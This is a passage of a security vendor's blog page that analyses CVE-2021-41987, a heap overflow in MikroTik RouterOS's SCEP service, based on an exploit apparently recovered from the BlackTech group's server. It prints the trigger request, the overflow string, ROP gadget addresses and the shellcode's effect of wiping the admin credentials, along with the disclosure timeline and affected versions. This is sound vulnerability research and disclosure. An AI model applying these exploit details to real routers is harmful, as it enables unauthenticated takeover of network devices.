L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a><a href="/en/products/threatvision/"><div class="css-vfpk1v"><div class="dropdown-item-image css-ric4bx"><img alt="threat-vision" loading="lazy" width="355" height="200" decoding="async" data-nimg="1" style="color:transparent" src="https://uploads.teamt5.org/internal/nav/threatvision.svg"/></div><div class="css-1lbeicl"><p class="css-1nm3lkf">ThreatVision</p><p class="css-1nm3lkf">Threat Intelligence Platform</p></div><div class="css-178e6ze"><div class="right css-142ads6"><svg width="40px" height="40px" viewBox="0 0 40 40"><g transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a><a href="/en/products/deep-dark-web-intelligence/"><div class="css-vfpk1v"><div class="dropdown-item-image css-1sohte5"><img alt="deep-dark-web-intelligence" loading="lazy" width="355" height="200" decoding="async" data-nimg="1" style="color:transparent" src="https://uploads.teamt5.org/internal/nav/deep-dark-web-intelligence.svg"/></div><div class="css-1lbeicl"><p class="css-1nm3lkf">Deep &amp; Dark Web Intelligence</p><p class="css-1nm3lkf">ThreatVision - latest intelligence module</p></div><div class="css-178e6ze"><div class="right css-142ads6"><svg width="40px" height="40px" viewBox="0 0 40 40"><g transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a></div></div></div></li><li id="header_company" class="css-111xtv1"><div class="css-gzr7f8 light"><span>COMPANY</span><svg viewBox="0 0 10 10" width="10" height="10" fill="#4C433F" class="light css-d8p5rg"><g transform="translate(-.333333 -.333333)"><path d="m10.0473785.61928813c.2603496.26034952.2603496.68245951 0 .94280904l-3.77135252 3.77092881 3.77135252 3.77154352c.2603496.26034953.2603496.68245951 0 .942809-.26034949.2603496-.68245947.2603496-.942809 0l-3.77154352-3.77135252-3.77092881 3.77135252c-.26034953.2603496-.68245952.2603496-.94280904 0-.26034953-.26034949-.26034953-.68245947 0-.942809l3.77073785-3.77154352-3.77073785-3.77092881c-.26034953-.26034953-.26034953-.68245952 0-.94280904.26034952-.26034953.68245951-.26034953.94280904 0l3.77092881 3.77073785 3.77154352-3.77073785c.26034953-.26034953.68245951-.26034953.942809 0z"></path><path d="m10.0473785.61928813c.2603496.26034952.2603496.68245951 0 .94280904l-3.77135252 3.77092881 3.77135252 3.77154352c.2603496.26034953.2603496.68245951 0 .942809-.26034949.2603496-.68245947.2603496-.942809 0l-3.77154352-3.77135252-3.77092881 3.77135252c-.26034953.2603496-.68245952.2603496-.94280904 0-.26034953-.26034949-.26034953-.68245947 0-.942809l3.77073785-3.77154352-3.77073785-3.77092881c-.26034953-.26034953-.26034953-.68245952 0-.94280904.26034952-.26034953.68245951-.26034953.94280904 0l3.77092881 3.77073785 3.77154352-3.77073785c.26034953-.26034953.68245951-.26034953.942809 0z"></path></g></svg><svg viewBox="0 0 12 7" width="12px" height="12px" class="light css-1g3s13r"><path d="M0.295367042,0.295011084 C0.689189766,-0.0983370279 1.32770256,-0.0983370279 1.72152528,0.295011084 L6,4.56832964 L10.2784747,0.295011084 C10.6722974,-0.0983370279 11.3108102,-0.0983370279 11.704633,0.295011084 C12.0984557,0.688359195 12.0984557,1.32610249 11.704633,1.7194506 L6.71307912,6.70498892 C6.3192564,7.09833703 5.6807436,7.09833703 5.28692088,6.70498892 L0.295367042,1.7194506 C-0.0984556808,1.32610249 -0.0984556808,0.688359195 0.295367042,0.295011084 Z"></path></svg></div><div class="css-1nj95pn"><div class="css-hwlzfs"><div class="css-cunqya"><a href="/en/about-us/"><div class="css-vfpk1v"><div class="dropdown-item-image css-1sohte5"><img alt="about-us" loading="lazy" width="355" height="200" decoding="async" data-nimg="1" style="color:transparent" src="https://uploads.teamt5.org/internal/nav/about_us.svg"/></div><div class="css-1lbeicl"><p class="css-1nm3lkf">ABOUT US</p><p class="css-1nm3lkf"></p></div><div class="css-178e6ze"><div class="right css-142ads6"><svg width="40px" height="40px" viewBox="0 0 40 40"><g transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a><a href="/en/careers/"><div class="css-vfpk1v"><div class="dropdown-item-image css-1sohte5"><img alt="careers" loading="lazy" width="355" height="200" decoding="async" data-nimg="1" style="color:transparent" src="https://uploads.teamt5.org/internal/nav/careers.svg"/></div><div class="css-1lbeicl"><p class="css-1nm3lkf">CAREERS</p><p class="css-1nm3lkf"></p></div><div class="css-178e6ze"><div class="right css-142ads6"><svg width="40px" height="40px" viewBox="0 0 40 40"><g transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a></div></div></div></li><li id="header_news-and-event" class="css-111xtv1"><a class="css-gzr7f8 light" href="/en/news-and-events/"><span>NEWS &amp; EVENTS</span></a></li><li id="header_blog" class="css-111xtv1"><a class="css-gzr7f8 light" href="/en/blog/"><span>BLOG</span></a></li><li id="header_contact-us" class="css-111xtv1"><div class="css-gzr7f8 light"><span>CONTACT US</span><svg viewBox="0 0 10 10" width="10" height="10" fill="#4C433F" class="light css-d8p5rg"><g transform="translate(-.333333 -.333333)"><path d="m10.0473785.61928813c.2603496.26034952.2603496.68245951 0 .94280904l-3.77135252 3.77092881 3.77135252 3.77154352c.2603496.26034953.2603496.68245951 0 .942809-.26034949.2603496-.68245947.2603496-.942809 0l-3.77154352-3.77135252-3.77092881 3.77135252c-.26034953.2603496-.68245952.2603496-.94280904 0-.26034953-.26034949-.26034953-.68245947 0-.942809l3.77073785-3.77154352-3.77073785-3.77092881c-.26034953-.26034953-.26034953-.68245952 0-.94280904.26034952-.26034953.68245951-.26034953.94280904 0l3.77092881 3.77073785 3.77154352-3.77073785c.26034953-.26034953.68245951-.26034953.942809 0z"></path><path d="m10.0473785.61928813c.2603496.26034952.2603496.68245951 0 .94280904l-3.77135252 3.77092881 3.77135252 3.77154352c.2603496.26034953.2603496.68245951 0 .942809-.26034949.2603496-.68245947.2603496-.942809 0l-3.77154352-3.77135252-3.77092881 3.77135252c-.26034953.2603496-.68245952.2603496-.94280904 0-.26034953-.26034949-.26034953-.68245947 0-.942809l3.77073785-3.77154352-3.77073785-3.77092881c-.26034953-.26034953-.26034953-.68245952 0-.94280904.26034952-.26034953.68245951-.26034953.94280904 0l3.77092881 3.77073785 3.77154352-3.77073785c.26034953-.26034953.68245951-.26034953.942809 0z"></path></g></svg><svg viewBox="0 0 12 7" width="12px" height="12px" class="light css-1g3s13r"><path d="M0.295367042,0.295011084 C0.689189766,-0.0983370279 1.32770256,-0.0983370279 1.72152528,0.295011084 L6,4.56832964 L10.2784747,0.295011084 C10.6722974,-0.0983370279 11.3108102,-0.0983370279 11.704633,0.295011084 C12.0984557,0.688359195 12.0984557,1.32610249 11.704633,1.7194506 L6.71307912,6.70498892 C6.3192564,7.09833703 5.6807436,7.09833703 5.28692088,6.70498892 L0.295367042,1.7194506 C-0.0984556808,1.32610249 -0.0984556808,0.688359195 0.295367042,0.295011084 Z"></path></svg></div><div class="css-1nj95pn"><div class="css-hwlzfs"><div class="css-cunqya"><a href="/en/contact-us/"><div class="css-vfpk1v"><div class="dropdown-item-image css-1sohte5"><img alt="contact-us" loading="lazy" width="355" height="200" decoding="async" data-nimg="1" style="color:transparent" src="https://uploads.teamt5.org/internal/nav/contact_us.svg"/></div><div class="css-1lbeicl"><p class="css-1nm3lkf">CONTACT US</p><p class="css-1nm3lkf"></p></div><div class="css-178e6ze"><div class="right css-142ads6"><svg width="40px" height="40px" viewBox="0 0 40 40"><g transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a><a href="/en/partners/"><div class="css-vfpk1v"><div class="dropdown-item-image css-1sohte5"><img alt="partners" loading="lazy" width="355" height="200" decoding="async" data-nimg="1" style="color:transparent" src="https://uploads.teamt5.org/internal/nav/partners.svg"/></div><div class="css-1lbeicl"><p class="css-1nm3lkf">PARTNERS</p><p class="css-1nm3lkf"></p></div><div class="css-178e6ze"><div class="right css-142ads6"><svg width="40px" height="40px" viewBox="0 0 40 40"><g transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a></div></div></div></li></ul><div class="css-126i2w1 navbar"><div class="css-1h1q0ci"><svg width="24" height="24" fill="none" aria-label="earth-icon" class="css-m0eduh light"><path fill="#4C433F" fill-rule="evenodd" d="M1 12c0-.064 0-.128.002-.192L1 11.744h.003c.048-2.126.7-4.103 1.791-5.767l-.003-.117h.08a10.99 10.99 0 0 1 8.646-4.85c.075-.006.15-.01.227-.01v.003C11.83 1 11.914 1 12 1c5.99 0 10.861 4.787 10.997 10.744H23l-.001.093L23 12c0 6.075-4.925 11-11 11l-.256-.003V23l-.159-.005a2.217 2.217 0 0 1-.068-.005C5.666 22.737 1 17.913 1 12Zm2.506-4.181a9.42 9.42 0 0 0-.97 4.01c.06 1.657 1.89 3.171 4.632 4.008A25.214 25.214 0 0 1 6.884 12c0-.684.025-1.353.074-2.004C5.44 9.49 4.224 8.74 3.506 7.82Zm3.622.608c-1.433-.53-2.427-1.284-2.716-2.086a9.489 9.489 0 0 1 4.409-3.259c-.797 1.32-1.385 3.183-1.693 5.345ZM8.471 10.4c-.034.52-.052 1.054-.052 1.6 0 1.526.14 2.963.382 4.234.996.184 2.073.285 3.199.285 1.027 0 2.013-.084 2.934-.239.247-1.282.392-2.735.392-4.28 0-.565-.02-1.118-.056-1.655a16.193 16.193 0 0 1-3.526.376c-1.15 0-2.256-.113-3.273-.322Zm6.641-1.597a14.517 14.517 0 0 1-3.368.383 14.67 14.67 0 0 1-3.12-.326c.482-3.586 1.74-6.164 3.001-6.318.124-.005.25-.007.375-.007l.103.005c1.26.133 2.52 2.691 3.01 6.263ZM16.78 9.91c.054.677.081 1.376.081 2.09 0 1.377-.103 2.698-.296 3.916 2.853-.808 4.788-2.337 4.896-4.023l.003-.088a9.418 9.418 0 0 0-1.192-4.411c-.618 1.06-1.866 1.932-3.492 2.516Zm2.425-4.05h-.041l-.006.121c-.08.887-1.047 1.747-2.555 2.353-.32-2.182-.926-4.054-1.745-5.36a9.475 9.475 0 0 1 4.347 2.886ZM3.18 15.441c1.109.825 2.581 1.482 4.279 1.905.33 1.409.792 2.63 1.362 3.572a9.494 9.494 0 0 1-5.641-5.477Zm5.955 2.236c.617 2.212 1.553 3.666 2.49 3.78.124.006.25.008.375.008.971 0 1.955-1.466 2.598-3.75a19.74 19.74 0 0 1-2.598.169c-.989 0-1.95-.072-2.865-.207Zm5.722 3.35a9.49 9.49 0 0 0 5.963-5.586c-1.167.869-2.738 1.55-4.55 1.97-.342 1.436-.822 2.673-1.413 3.615Z" clip-rule="evenodd"></path></svg><p class="light">EN</p><svg width="16" height="16" fill="none" aria-label="dropdown-icon" class="css-cqhf6t light"><path fill="#4C433F" fill-rule="evenodd" d="M2.295 6.295a1.01 1.01 0 0 1 1.427 0L8 10.568l4.278-4.273a1.01 1.01 0 0 1 1.427 0 1.006 1.006 0 0 1 0 1.424l-4.992 4.986a1.01 1.01 0 0 1-1.426 0L2.295 7.719a1.006 1.006 0 0 1 0-1.424Z" clip-rule="evenodd"></path></svg></div></div></div></div></nav></div><div><main class="css-1blv94u"><div class="css-1ipix51"><div class="css-1sf8wwi" style="background-image:url(https://uploads.teamt5.org/upload/original/mikrotik_banner_lava.jpg)"></div><div class="css-1kmzmc6"><div class="css-11u74fh"><div class="css-1hklc6p">Technical Analysis</div><div class="css-qdphv9"><a class="css-v7iset">Subscribe</a><a class="css-v7iset">RSS</a></div></div><h1 class="">Vulnerability Exposure &amp; Notification on Mikrotik (CVE-2021-41987) </h1></div></div><div class="css-edbnnu"><div class="css-73ect7 bgBottom"><div class="css-1xbxfgz"><div class="css-glrwwq"><span>2022.03.01</span><span class="css-1ntlumm"></span><span>D39</span></div><div class="css-1s7wsad"><span>Share: </span><a class="css-1dnxym2"><button aria-label="facebook" class="react-share__ShareButton" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg width="36" height="36" fill="none" aria-label="facebook-icon"><path fill="#4C433F" d="M3 0a3 3 0 0 0-3 3v30a3 3 0 0 0 3 3h12v-.03l.188.03V23.345h-4.57V18.11h4.57v-3.99c0-4.539 2.687-7.046 6.798-7.046 1.97 0 4.03.354 4.03.354v4.457h-2.27c-2.236 0-2.933 1.396-2.933 2.828v3.397h4.992l-.798 5.235h-4.195V36l.188-.03V36h12a3 3 0 0 0 3-3V3a3 3 0 0 0-3-3H3Z"></path></svg></button></a><a class="css-1dnxym2"><button aria-label="linkedin" class="react-share__ShareButton" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg width="36" height="36" fill="none" aria-label="linked-in-icon"><path fill="#4C433F" fill-rule="evenodd" d="M0 3a3 3 0 0 1 3-3h30a3 3 0 0 1 3 3v28.5c0 .084-.002.167-.007.249.005.059.007.119.007.18v1.446A2.625 2.625 0 0 1 33.375 36H3a3 3 0 0 1-3-3v-.257c0-.197.017-.386.05-.567A4.537 4.537 0 0 1 0 31.5v-27c0-.165.009-.329.026-.49A3.233 3.233 0 0 1 0 3.596V3Zm9.087 1.777a3.087 3.087 0 1 0 0 6.174 3.087 3.087 0 0 0 0-6.174ZM6.41 30.274h5.33v-17.02H6.41v17.02Zm13.887-14.85c.872-1.716 3.875-3.571 8.242-1.878 3.316 1.287 2.95 6.21 2.95 6.21v10.518h-5.3v-9.838c0-.564-.323-1.567-.427-1.728a2.825 2.825 0 0 1-.047-.076c-.126-.213-.381-.642-.825-.83-.507-.215-1.382-.43-2.335-.215-.952.215-1.736.937-1.982 1.828a8.062 8.062 0 0 0-.276 1.62v9.24h-5.27v-17.02h5.054v2.353h.081l.135-.184Z" clip-rule="evenodd"></path></svg></button></a><a class="css-1dnxym2"><button aria-label="twitter" class="react-share__ShareButton" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg width="37" height="37" fill="none" aria-label="twitter-icon"><path fill="#4C433F" fill-rule="evenodd" d="M2.354.269a2 2 0 0 0-2 2v32a2 2 0 0 0 2 2h32a2 2 0 0 0 2-2v-32a2 2 0 0 0-2-2h-32Zm28.62 4.5L20.923 16.453l10.931 15.91h-8.04l-7.361-10.714-9.217 10.713H4.854L15.395 20.11 4.855 4.769h8.04l6.97 10.145 8.727-10.145h2.382ZM16.592 18.717l1.069 1.528 7.274 10.406h3.659l-8.915-12.752-1.068-1.527-6.858-9.81H8.094l8.498 12.155Z" clip-rule="evenodd"></path></svg></button></a></div></div><div class="css-sz4o"><div class="css-8sr13a"><div><h2 id="brief">Brief</h2><div class="paragraph">In 2021, we discovered an open directory on Huapiâs C2. We found the source code contained an exploit aiming at Mikrotik routers. More specifically, our analysis found that the exploit would allow the attackers to send specially crafted payloads to achieve Remote Code Execution (RCE) via WAN without any authentications. The targeted RouterOS products include mikrotik-tile-6.46.8, mikrotik-vm-64.8, and mikrotik-vm-6.48.</div><div class="paragraph">TeamT5 alerted Mikrotik to patch this vulnerability upon discovery. The patch for this vulnerability was released on 2021/11/17 and can be downloaded from the official Mikrotik website. All affected organizations should update their RouterOS immediately to avoid actorsâ exploitation.</div><div class="paragraph">HUAPI (aka BlackTech, Palmerworm, or PLEAD) has been active since 2007 and has been targeting Taiwan for over a decade. Huapiâs malwares are highly sophisticated, and some of them use unique anti-analysis packers. Some of Huapiâs malware utilized a modified RC4 algorithm to encrypt the malicious C2 communication. Huapi focused on governmental entities, technology or telecommunication industries, and think tanks. Our observation suggested that over half of the victims were governmental agencies in Taiwan, the United States, Japan, and South Korea.</div><h3 id="attack-vector">Attack vector</h3><div class="paragraph">As a powerful and easy-to-use router, Mikrotik routerboard supports SCEP (Simple Certificate Enrollment Protocol), a service that was designed for simple certificate delivery. During transport, the binary data is encoded in Base64 via HTTP GET. Unfortunately, when processing the data from the payload, a miscalculation may occur if the payload is not properly formatted, potentially resulting in a Heap-based Buffer Overflow.</div><div class="paragraph">The open directory we had discovered contained exploit code that targeted <code>mikrotik-tile-6.46.8</code>, <code>mikrotik-vm-64.8</code> and <code>mikrotik-vm-6.48</code>, along with their corresponding shellcode snippets. In the following sections, we will be analyzing the exploit code that was designed for <code>mikrotik-vm-6.46.8</code>.</div><h4 id="root-cause-analysis">Root cause analysis</h4><div class="paragraph">By sending the following payload, we can cause the service <code>www</code> to crash and potentially trigger a Heap-based Buffer Overflow.</div><div class="paragraph"> <code>GET /scep/{scep_server_name}?operation=PKIOperation&amp;message={} HTTP/1.1\r\n</code></div><div class="paragraph">The crash can be traced back to the function <code>base64Decode</code>, located under <code>ScepRequest::parseRequest</code> from <code>/nova/lib/www/scep.p</code>. When unpacking the Base64 request, the following code is used to calculate the output buffer size,</div><div class="paragraph"><code>output_buffer_length = 3 * (input_buffer_length &gt;&gt; 2)</code></div><div class="paragraph">â¦which may cause a miscalculation of the output buffer, resulting in an insufficient memory allocation from <code>malloc</code>, leading to a heap overflow.</div><div class="paragraph"><img alt="Mikrotik 1.png" src="https://uploads.teamt5.org/upload/original/pic1_vulnerability-mikrotik-cve-2021-41987.png" class="css-1h5x3dy" loading="lazy"/></div>
<h4 id="what-happened">What happened?</h4><div class="paragraph">For instance, we assume that the our input data is <code>xxxxxxxxxxxxxxxxhCE</code>, and the length of input buffer is 19. Based on the decompiled code, <code>out_len = 3 * (input_len &gt;&gt; 2)</code> which is <code>out_len = 3 * (input_len // 4)</code> (double slashes represent integer division), thereby allocating 12 bytes as decoded data buffer. However, the decoded data buffer should be 14 bytes instead of 12. This oversight allows the attacker to overwrite data in heap.</div><h4 id="overview-of-the-exploit-flow">Overview of the exploit flow</h4><div class="paragraph">According to the chunk-recycling mechanism, by overwriting the chunk size of a chunk in bins to a larger value (<code>0x4121</code>), the next <code>malloc</code> call will return a heap chunk overlapped with allocated chunks. This will lead to a heap overflow when writing to the chunk.</div><div class="paragraph">The part which will be overwritten is a vtable pointer in a destructor (<code>sub_8052E90</code>) function, and by setting the register <code>edx</code> to <code>0x8061a74</code>, the instruction <code>call [edx+4]</code> will execute the gadget at <code>0x8058e89</code> ( <code>xchg eax, ebp; ret;</code> ) and execute the shellcode after pivoting the stack to the attacker-owned buffer.</div><div class="paragraph"><img alt="Mikrotik 2.png" src="https://uploads.teamt5.org/upload/original/pic2_vulnerability-mikrotik-cve-2021-41987.png" class="css-1h5x3dy" loading="lazy"/></div>
<h4 id="heap-spray">Heap spray</h4><div class="paragraph">The attacker can begin heap spraying by requesting 64 concurrent connections, and close some of them in order to let the vtable pointer be overwriten by the heap overflow later.</div><div class="paragraph"><img alt="Mikrotik 3.png" src="https://uploads.teamt5.org/upload/original/pic3_vulnerability-mikrotik-cve-2021-41987.png" class="css-1h5x3dy" loading="lazy"/></div><div class="paragraph">The function <code>aaaa</code> assembles the ROP gadgets, and the variable <code>sc</code> contains the shellcode for execution.
<img alt="Mikrotik 4.png" src="https://uploads.teamt5.org/upload/original/pic4_vulnerability-mikrotik-cve-2021-41987.png" class="css-1h5x3dy" loading="lazy"/></div><h4 id="trigger-heap-overflow">Trigger heap overflow</h4><div class="paragraph">The function <code>bbbb</code> sends the payloads to the victim server in the aforementioned format.</div><div class="paragraph"><img alt="Mikrotik 5.png" src="https://uploads.teamt5.org/upload/original/pic5_vulnerability-mikrotik-cve-2021-41987.png" class="css-1h5x3dy" loading="lazy"/>
<img alt="Mikrotik 6.png" src="https://uploads.teamt5.org/upload/original/pic6_vulnerability-mikrotik-cve-2021-41987.png" class="css-1h5x3dy" loading="lazy"/></div><div class="paragraph">The parameter message (<code>&#x27;x&#x27;*801*4+&#x27;hCE&#x27;</code>) in the function <code>bbbb</code> will overwrite the size of next chunk. Here in gdb , it shows that the parameter message has been decoded to <code>c7 1c 71 84 21</code> at <code>0x80859f0</code>, and the last byte <code>\x21</code> has been written as the next chunk size at <code>0x80859f4</code>.</div><div class="paragraph"><img alt="Mikrotik 7.png" src="https://uploads.teamt5.org/upload/original/pic7_vulnerability-mikrotik-cve-2021-41987.png" class="css-1h5x3dy" loading="lazy"/></div><h4 id="attempting-to-retrieve-the-oversized-chunk-on-heap">Attempting to retrieve the oversized chunk on heap</h4><div class="paragraph"><img alt="Mikrotik 8.png" src="https://uploads.teamt5.org/upload/original/pic8_vulnerability-mikrotik-cve-2021-41987.png" class="css-1h5x3dy" loading="lazy"/></div><div class="paragraph">In order to retrieve the overflowed chunk, we need to send out more request. At some point, the register <code>edx</code> will be set to <code>0x8061a74</code> when the attempt reaches <code>i=3</code>.</div><div class="paragraph"><img alt="Mikrotik 9.png" src="https://uploads.teamt5.org/upload/original/pic9_vulnerability-mikrotik-cve-2021-41987.png" class="css-1h5x3dy" loading="lazy"/></div><h4 id="trigger-destructor">Trigger destructor</h4><div class="paragraph">The final step of the exploit, set off destructor  <code>call [edx+4]</code> by closing connections.
<img alt="Mikrotik 10.png" src="https://uploads.teamt5.org/upload/original/pic10_vulnerability-mikrotik-cve-2021-41987.png" class="css-1h5x3dy" loading="lazy"/></div><h4 id="fingers-crossed">Fingers crossed</h4><div class="paragraph">Thanks to the heap spraying at the initial phase of the exploit, the data in the address <code>0x8061a74</code> will be modified, thus the instruction <code>call [edx+4]</code> will end up calling <code>0x8058e89</code> instead (the address of gadget <code>xchg eax, ebp; ret;</code>) and start executing our gadgets.</div><div class="paragraph"><img alt="Mikrotik 11.png" src="https://uploads.teamt5.org/upload/original/pic11_vulnerability-mikrotik-cve-2021-41987.png" class="css-1h5x3dy" loading="lazy"/></div><div class="paragraph">Once the gadgets have been hit, <code>0x8058e89: xchg eax, ebp; ret</code> and <code>0x8052eb9: leave</code> will allow us to pivot from the stack to the controllable buffer and start to execute our ROP chain from <code>0x804fbfc</code>.</div><div class="paragraph">The ROP chain will try to increase the address of <code>open</code> to the address of <code>mprotect</code>, and the <code>0x804fc04: pop esp; ret;</code> will set <code>esp</code> to <code>0x8061a74+8</code> to wrap up the ROP chain. Lastly, calling <code>mprotect</code> and jump right into the shellcode (<code>0x8061674</code>).</div><div class="paragraph"><img alt="Mikrotik 12.png" src="https://uploads.teamt5.org/upload/original/pic12_vulnerability-mikrotik-cve-2021-41987.png" class="css-1h5x3dy" loading="lazy"/></div><div class="paragraph">In the exploit, the shellcode can be interpreted as <code>unlink(&#x27;/nova/store/user.data&#x27;) + sync() + reboot()</code>, after the target device has finished rebooting. The attacker should then be able to login into web service as admin without a password.</div><h3 id="conclusion">Conclusion</h3><div class="paragraph">To wrap up, letâs go over the exploit code once again:</div><div class="paragraph"><strong>1. Low stability</strong></div><ul><li><div>Since <code>add()</code> does not work in our favor and that ASLR is enabled by default, the exploit chain may fail on the first try.</div></li><li><div>Occasionally, even though the <code>/nova/store/user.dat</code> file will be deleted, the device does not end up rebooting. The shellcode may require extra improvements to make it more stable.</div></li><li><div>Even in best case scenario, the success rate is only about 5~6%.</div></li><li><div>Thankfully, in the event where the attack attempt fails, the watchdog process will restart the <code>www</code> service for us. This ensures stability and allows the attacker to not cause noticeable disruption during the attack.</div></li></ul><div class="paragraph"><strong>2. Strict prerequisites</strong></div><ul><li><div>The attacker must be aware of the path name <code>scep_server_name</code> before being able to begin such attack.</div></li></ul><div class="paragraph"><strong>3. Disclosure Timeline</strong></div><div class="paragraph"><code>2021/07/11</code>: Acquire exploit codes from the open directory</div><div class="paragraph"><code>2021/10/04</code>: Responsible disclosure to Mikrotik and reserved CVE-2021-41987</div><div class="paragraph"><code>2021/11/17</code>: Official patch released</div><div class="paragraph"><code>2022/03/01</code>: Full disclosure released</div><div class="paragraph"><strong>4. Affected versions of RouterOS</strong></div><ul><li><div><code>6.46.8</code></div></li><li><div><code>6.47.9</code></div></li><li><div><code>6.47.10</code></div></li></ul><h3 id="about-teamt5-d39">About TeamT5 D39</h3><div class="paragraph">D39 is committed to the field of vulnerability security and vulnerability discovery. The research scope includes systems and devices that are connected to the Internet, such as mobile devices, IoT devices, Linux, and Windows. Our team has held a number of critical or important vulnerabilities and has conducted presentations across various major security conferences, such as Blackhat, HITCON, etc.</div><div class="paragraph">Exploit research has always been one of the most advanced fields in network attack and defense. TeamT5 expects to invest resources to cultivate more talents to enter this field, and expects to have more and more world-leading vulnerability research talents in Taiwan. We welcome those who dare to face unknown challenges, are committed to vulnerability research and discovery, and have independent research capabilities to join us. ð¤</div><h3 id="reference">Reference</h3><ul><li><div><a target="_blank" href="https://wiki.mikrotik.com/wiki/Manual:System/Certificates">https://wiki.mikrotik.com/wiki/Manual:System/Certificates</a></div></li><li><div><a target="_blank" href="https://en.wikipedia.org/wiki/Base64">https://en.wikipedia.org/wiki/Base64</a></div></li></ul><div class="paragraph">*Image courtesy of Pixabay</div></div></div></div><div class="css-1xbxfgz"><div class="css-glrwwq hide"><span>2022.03.01</span><span class="css-1ntlumm"></span><span>D39</span></div><div class="css-1s7wsad"><span>Share: </span><a class="css-1dnxym2"><button aria-label="facebook" class="react-share__ShareButton" 